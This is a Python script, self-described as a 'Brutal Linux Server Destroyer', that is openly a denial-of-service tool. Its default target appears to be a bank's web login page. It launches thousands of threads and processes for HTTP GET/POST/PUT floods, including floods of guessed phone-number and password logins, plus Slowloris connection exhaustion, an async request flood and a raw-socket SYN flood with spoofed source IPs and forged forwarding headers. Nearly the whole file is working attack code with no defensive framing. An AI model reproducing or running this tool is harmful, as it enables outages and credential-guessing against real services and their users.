#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🔥 BRUTAL LINUX SERVER DESTROYER 🔥
Ultimate DoS attack optimized for Linux systems - AMD EPYC Edition
Designed to utilize maximum system resources on Linux
"""

import requests
import asyncio
import aiohttp
import time
import threading
import random
import socket
import ssl
import multiprocessing
import platform
import os
import sys
import signal
import psutil
import resource
from concurrent.futures import ThreadPoolExecutor, as_completed, ProcessPoolExecutor
from datetime import datetime
from urllib.parse import urlparse
import warnings
import logging
import queue
import select
import errno
import fcntl
import struct

# Ignore all warnings and suppress asyncio task warnings
warnings.filterwarnings('ignore')
logging.getLogger('asyncio').setLevel(logging.CRITICAL)
logging.getLogger('aiohttp').setLevel(logging.CRITICAL)

# Linux-specific optimizations
def optimize_linux_system():
    """Optimize Linux system for maximum performance"""
    try:
        # Increase file descriptor limits
        resource.setrlimit(resource.RLIMIT_NOFILE, (65536, 65536))
        
        # Set process priority to highest
        os.nice(-20)
        
        # Set CPU affinity to use all cores
        os.sched_setaffinity(0, range(multiprocessing.cpu_count()))
        
        print("🚀 Linux system optimized for maximum performance!")
    except Exception as e:
        print(f"⚠️  System optimization warning: {e}")

class LinuxBrutalDestroyer:
    def __init__(self, target_url="https://iibss.iraqiislamicb.iq/web/"):
        self.target_url = target_url
        self.successful_requests = 0
        self.failed_requests = 0
        self.lock = threading.Lock()
        self.running = True
        
        # System resources detection
        self.cpu_count = multiprocessing.cpu_count()
        self.memory_gb = psutil.virtual_memory().total // (1024**3)
        
        # Linux-optimized settings based on AMD EPYC
        self.max_workers = self.cpu_count * 1000  # 1000 workers per CPU core
        self.max_sockets = 50000  # Increased for Linux
        self.max_async_tasks = 10000  # More async tasks for Linux
        self.max_processes = self.cpu_count * 4  # More processes
        
        # Parse URL
        self.parsed_url = urlparse(target_url)
        self.host = self.parsed_url.hostname
        self.port = self.parsed_url.port or (443 if self.parsed_url.scheme == 'https' else 80)
        self.is_https = self.parsed_url.scheme == 'https'
        
        # Enhanced User Agent list
        self.user_agents = [
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; CentOS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Red Hat Enterprise Linux; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; SUSE Linux; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0",
            "Mozilla/5.0 (X11; Arch Linux; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Manjaro Linux; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        ]
        
        # Diverse attack payloads
        self.login_payloads = []
        for i in range(200):  # More payloads for Linux
            self.login_payloads.append({
                "phone": f"07{random.randint(10000000, 99999999)}", 
                "password": random.choice(["123456", "password", "admin", "test", "12345678", "qwerty", "abc123", "root", "user", "login", "guest", "demo", "toor", "linux", "ubuntu"])
            })

    def get_random_headers(self):
        """Generate random headers with advanced IP spoofing"""
        return {
            'User-Agent': random.choice(self.user_agents),
            'Accept': random.choice([
                'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'application/json, text/plain, */*',
                'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            ]),
            'Accept-Language': random.choice(['en-US,en;q=0.9', 'ar,en-US;q=0.8', 'en-GB,en;q=0.9']),
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': random.choice(['no-cache', 'max-age=0', 'no-store']),
            'Pragma': 'no-cache',
            'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            'X-Real-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            'X-Originating-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            'X-Remote-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            'X-Remote-Addr': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            'X-Client-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            'CF-Connecting-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            'X-Cluster-Client-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            'Via': f"1.1 proxy{random.randint(1,999)}.example.com",
        }

    def linux_http_destroyer(self, worker_id):
        """Linux-optimized HTTP worker with enhanced performance"""
        session = requests.Session()
        session.verify = False
        
        # Linux-specific session optimization
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=200,  # More connections for Linux
            pool_maxsize=200,
            max_retries=0,
            socket_options=[(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)]
        )
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        
        while self.running:
            try:
                headers = self.get_random_headers()
                
                # Enhanced attack methods
                attack_type = random.randint(1, 6)
                
                if attack_type == 1:  # POST login attack
                    headers['Content-Type'] = 'application/x-www-form-urlencoded'
                    data = random.choice(self.login_payloads)
                    response = session.post(self.target_url, headers=headers, data=data, timeout=2)
                
                elif attack_type == 2:  # GET flood
                    response = session.get(self.target_url, headers=headers, timeout=2)
                
                elif attack_type == 3:  # GET with parameters
                    params = {f'param{i}': random.randint(1, 999999) for i in range(random.randint(1, 10))}
                    response = session.get(self.target_url, headers=headers, params=params, timeout=2)
                
                elif attack_type == 4:  # HEAD requests
                    response = session.head(self.target_url, headers=headers, timeout=2)
                
                elif attack_type == 5:  # OPTIONS requests
                    response = session.options(self.target_url, headers=headers, timeout=2)
                
                else:  # PUT requests
                    data = {'data': os.urandom(random.randint(100, 1000)).hex()}
                    response = session.put(self.target_url, headers=headers, json=data, timeout=2)
                
                with self.lock:
                    self.successful_requests += 1
                
            except Exception:
                with self.lock:
                    self.failed_requests += 1
            
            # Minimal delay for maximum speed
            time.sleep(random.uniform(0.00001, 0.0001))

    def linux_slowloris_destroyer(self):
        """Advanced Linux Slowloris attack with epoll"""
        sockets = []
        
        def create_socket():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                
                if self.is_https:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=self.host)
                
                s.connect((self.host, self.port))
                
                # Send incomplete HTTP request
                s.send(f"GET {self.parsed_url.path or '/'} HTTP/1.1\r\n".encode())
                s.send(f"Host: {self.host}\r\n".encode())
                s.send(f"User-Agent: {random.choice(self.user_agents)}\r\n".encode())
                s.send("Accept-language: en-US,en;q=0.5\r\n".encode())
                
                return s
            except Exception:
                return None
        
        while self.running:
            # Maintain maximum socket connections
            while len(sockets) < self.max_sockets and self.running:
                s = create_socket()
                if s:
                    sockets.append(s)
                
                # Create sockets in batches for efficiency
                if len(sockets) % 100 == 0:
                    time.sleep(0.01)
            
            # Send keep-alive headers to all sockets
            for s in list(sockets):
                try:
                    s.send(f"X-a: {random.randint(1, 999999)}\r\n".encode())
                except:
                    try:
                        sockets.remove(s)
                        s.close()
                    except:
                        pass
            
            time.sleep(0.1)

    async def linux_async_destroyer(self):
        """Ultra-fast Linux async attack with optimized connector"""
        # Linux-optimized connector
        connector = aiohttp.TCPConnector(
            limit=self.max_async_tasks,
            limit_per_host=0,
            ssl=False,
            keepalive_timeout=60,
            enable_cleanup_closed=True,
            use_dns_cache=True,
            ttl_dns_cache=600,
            sock_read=65536,
            sock_connect=10
        )
        
        timeout = aiohttp.ClientTimeout(total=2, connect=0.5)
        
        tasks = []
        try:
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                
                async def async_attack_task(task_id):
                    try:
                        while self.running:
                            try:
                                headers = self.get_random_headers()
                                
                                # Enhanced attack methods
                                attack_type = random.randint(1, 4)
                                
                                if attack_type == 1:
                                    # POST attack
                                    data = random.choice(self.login_payloads)
                                    async with session.post(self.target_url, headers=headers, data=data) as response:
                                        await response.read()
                                elif attack_type == 2:
                                    # GET attack
                                    async with session.get(self.target_url, headers=headers) as response:
                                        await response.read()
                                elif attack_type == 3:
                                    # HEAD attack
                                    async with session.head(self.target_url, headers=headers) as response:
                                        await response.read()
                                else:
                                    # PUT attack
                                    data = {'data': os.urandom(100).hex()}
                                    async with session.put(self.target_url, headers=headers, json=data) as response:
                                        await response.read()
                                
                                with self.lock:
                                    self.successful_requests += 1
                                    
                            except asyncio.CancelledError:
                                break
                            except Exception:
                                with self.lock:
                                    self.failed_requests += 1
                            
                            if not self.running:
                                break
                                
                            await asyncio.sleep(0.00001)
                    except asyncio.CancelledError:
                        pass
                    except Exception:
                        pass
                
                # Create massive number of async tasks
                for i in range(self.max_async_tasks):
                    task = asyncio.create_task(async_attack_task(i))
                    tasks.append(task)
                
                try:
                    await asyncio.gather(*tasks, return_exceptions=True)
                except Exception:
                    pass
                    
        except Exception:
            pass
        finally:
            # Properly cancel all remaining tasks
            for task in tasks:
                if not task.done():
                    task.cancel()
            
            if tasks:
                try:
                    await asyncio.wait_for(
                        asyncio.gather(*tasks, return_exceptions=True),
                        timeout=1.0
                    )
                except Exception:
                    pass

    def linux_raw_socket_attack(self):
        """Linux raw socket attack (requires root)"""
        try:
            while self.running:
                try:
                    # Create raw socket
                    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                    
                    # Send raw packets
                    for _ in range(100):
                        if not self.running:
                            break
                        
                        # Create fake IP packet
                        fake_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                        packet = self.create_tcp_packet(fake_ip, self.host, self.port)
                        
                        try:
                            s.sendto(packet, (self.host, 0))
                        except Exception:
                            pass
                    
                    s.close()
                    time.sleep(0.01)
                except Exception:
                    time.sleep(0.1)
        except Exception:
            pass

    def create_tcp_packet(self, src_ip, dst_ip, dst_port):
        """Create TCP SYN packet"""
        try:
            # Simple TCP SYN packet creation
            packet = b'\x45\x00\x00\x28'  # IP header start
            packet += struct.pack('!H', random.randint(1, 65535))  # ID
            packet += b'\x40\x00\x40\x06'  # Flags and protocol
            packet += b'\x00\x00'  # Checksum (will be calculated by kernel)
            packet += socket.inet_aton(src_ip)  # Source IP
            packet += socket.inet_aton(dst_ip)  # Destination IP
            
            # TCP header
            packet += struct.pack('!H', random.randint(1024, 65535))  # Source port
            packet += struct.pack('!H', dst_port)  # Destination port
            packet += struct.pack('!L', random.randint(1, 4294967295))  # Sequence number
            packet += b'\x00\x00\x00\x00'  # Acknowledgment number
            packet += b'\x50\x02\x20\x00'  # Header length, flags (SYN), window size
            packet += b'\x00\x00\x00\x00'  # Checksum and urgent pointer
            
            return packet
        except Exception:
            return b'\x00' * 40

    def process_destroyer(self, process_id):
        """Enhanced process worker for multi-processing attack"""
        # Set process affinity
        try:
            os.sched_setaffinity(0, [process_id % self.cpu_count])
        except Exception:
            pass
        
        local_success = 0
        local_failed = 0
        
        session = requests.Session()
        session.verify = False
        
        # Process-specific optimization
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=100,
            pool_maxsize=100,
            max_retries=0
        )
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        
        while self.running:
            try:
                headers = self.get_random_headers()
                
                if random.randint(1, 2) == 1:
                    data = random.choice(self.login_payloads)
                    response = session.post(self.target_url, headers=headers, data=data, timeout=1)
                else:
                    response = session.get(self.target_url, headers=headers, timeout=1)
                
                local_success += 1
                
            except Exception:
                local_failed += 1
            
            time.sleep(0.00001)
        
        return local_success, local_failed

    def ultimate_linux_destruction(self):
        """Launch all attack types optimized for Linux AMD EPYC"""
        print("🔥" * 50)
        print("💀💀💀    ULTIMATE LINUX BRUTAL DESTROYER    💀💀💀")
        print("🚀    AMD EPYC ROME EDITION - MAXIMUM POWER    🚀")
        print("🔥" * 50)
        print(f"🎯 TARGET: {self.target_url}")
        print(f"💻 CPU CORES: {self.cpu_count}")
        print(f"🧠 MEMORY: {self.memory_gb} GB")
        print(f"🧵 MAX WORKERS: {self.max_workers}")
        print(f"🔌 MAX SOCKETS: {self.max_sockets}")
        print(f"⚡ MAX ASYNC TASKS: {self.max_async_tasks}")
        print(f"🏭 MAX PROCESSES: {self.max_processes}")
        print("🚨 ALL LINUX ATTACK TYPES ACTIVE - TOTAL ANNIHILATION!")
        print("⚡ Press Ctrl+C to stop the carnage")
        print("=" * 80)
        
        # Start all attack types
        threads = []
        
        # 1. Multi-threaded HTTP attacks (Linux optimized)
        print("🚀 Starting Linux HTTP destroyer army...")
        for i in range(min(self.max_workers, 5000)):  # More workers on Linux
            thread = threading.Thread(target=self.linux_http_destroyer, args=(i,), daemon=True)
            thread.start()
            threads.append(thread)
        
        # 2. Linux Slowloris attack
        print("🐌 Starting Linux Slowloris destroyer...")
        for i in range(self.cpu_count):
            slowloris_thread = threading.Thread(target=self.linux_slowloris_destroyer, daemon=True)
            slowloris_thread.start()
            threads.append(slowloris_thread)
        
        # 3. Linux async attack
        print("⚡ Starting Linux async destroyer...")
        def run_async_attack():
            try:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                try:
                    loop.run_until_complete(self.linux_async_destroyer())
                except Exception:
                    pass
                finally:
                    try:
                        pending = asyncio.all_tasks(loop)
                        for task in pending:
                            task.cancel()
                        
                        if pending:
                            loop.run_until_complete(asyncio.gather(*pending, return_exceptions=True))
                    except Exception:
                        pass
                    finally:
                        loop.close()
            except Exception:
                pass
        
        for i in range(2):  # Multiple async threads
            async_thread = threading.Thread(target=run_async_attack, daemon=True)
            async_thread.start()
            threads.append(async_thread)
        
        # 4. Raw socket attack (if root)
        if os.geteuid() == 0:
            print("🔥 Starting raw socket attack (ROOT MODE)...")
            for i in range(self.cpu_count):
                raw_thread = threading.Thread(target=self.linux_raw_socket_attack, daemon=True)
                raw_thread.start()
                threads.append(raw_thread)
        else:
            print("⚠️  Raw socket attack skipped (requires root)")
        
        # 5. Multi-process attack (Linux optimized)
        print("🚀 Starting Linux process destroyer army...")
        process_pool = ProcessPoolExecutor(max_workers=self.max_processes)
        process_futures = []
        for i in range(self.max_processes):
            future = process_pool.submit(self.process_destroyer, i)
            process_futures.append(future)
        
        print(f"💀 LINUX TOTAL DESTRUCTION INITIATED!")
        print(f"🧵 THREADS: {len(threads)}")
        print(f"🏭 PROCESSES: {self.max_processes}")
        print(f"🔥 TOTAL POWER: {len(threads) + self.max_processes} ATTACK UNITS")
        print("=" * 80)
        
        # Monitor and display stats
        start_time = time.time()
        try:
            while self.running:
                elapsed = time.time() - start_time
                total_requests = self.successful_requests + self.failed_requests
                rps = total_requests / elapsed if elapsed > 0 else 0
                
                # Get system stats
                cpu_percent = psutil.cpu_percent()
                memory_percent = psutil.virtual_memory().percent
                
                print(f"\r💀 LINUX ANNIHILATING: {total_requests:,} | "
                      f"RPS: {rps:.0f} | "
                      f"SUCCESS: {self.successful_requests:,} | "
                      f"FAILED: {self.failed_requests:,} | "
                      f"TIME: {elapsed:.0f}s | "
                      f"CPU: {cpu_percent:.1f}% | "
                      f"MEM: {memory_percent:.1f}% | "
                      f"THREADS: {len([t for t in threads if t.is_alive()])}", 
                      end="", flush=True)
                
                time.sleep(0.3)  # Faster updates
                
        except KeyboardInterrupt:
            print("\n\n🛑 LINUX DESTRUCTION STOPPED BY USER")
            self.running = False
            
            # Give threads time to see the running flag change
            time.sleep(1)
            
            # Cleanup processes
            print("🧹 Cleaning up Linux processes...")
            try:
                process_pool.shutdown(wait=False)
            except Exception:
                pass
            
            # Final stats
            total_time = time.time() - start_time
            total_requests = self.successful_requests + self.failed_requests
            final_rps = total_requests / total_time if total_time > 0 else 0
            
            print("=" * 80)
            print("💀 FINAL LINUX ANNIHILATION REPORT 💀")
            print("=" * 80)
            print(f"🎯 Target: {self.target_url}")
            print(f"⏱️  Duration: {total_time:.2f} seconds")
            print(f"📊 Total Requests: {total_requests:,}")
            print(f"✅ Successful: {self.successful_requests:,}")
            print(f"❌ Failed: {self.failed_requests:,}")
            print(f"🔥 Average RPS: {final_rps:.2f}")
            print(f"💻 AMD EPYC Cores Used: {self.cpu_count}")
            print(f"🧠 Memory: {self.memory_gb} GB")
            print(f"🧵 Threads Deployed: {len(threads)}")
            print(f"🏭 Processes Deployed: {self.max_processes}")
            print("💀 LINUX SERVER ANNIHILATION COMPLETE 💀")
            print("=" * 80)


def main():
    """Launch ultimate Linux destruction"""
    # Check if running on Linux
    if platform.system() != 'Linux':
        print("❌ This script is optimized for Linux systems only!")
        print("💡 Use brutal_server_stress_test.py for Windows/other systems")
        sys.exit(1)
    
    # Optimize Linux system
    optimize_linux_system()
    
    target_url = "url"
    
    # Create Linux destroyer
    destroyer = LinuxBrutalDestroyer(target_url)
    
    # Setup signal handler for proper cleanup
    def signal_handler(signum, frame):
        print("\n🛑 Received interrupt signal, shutting down gracefully...")
        destroyer.running = False
        time.sleep(2)
        sys.exit(0)
    
    # Register signal handlers
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    try:
        # Begin total Linux annihilation
        destroyer.ultimate_linux_destruction()
    except Exception as e:
        print(f"\n❌ Error occurred: {e}")
        destroyer.running = False
    finally:
        destroyer.running = False
        print("🧹 Linux cleanup completed")


main() 
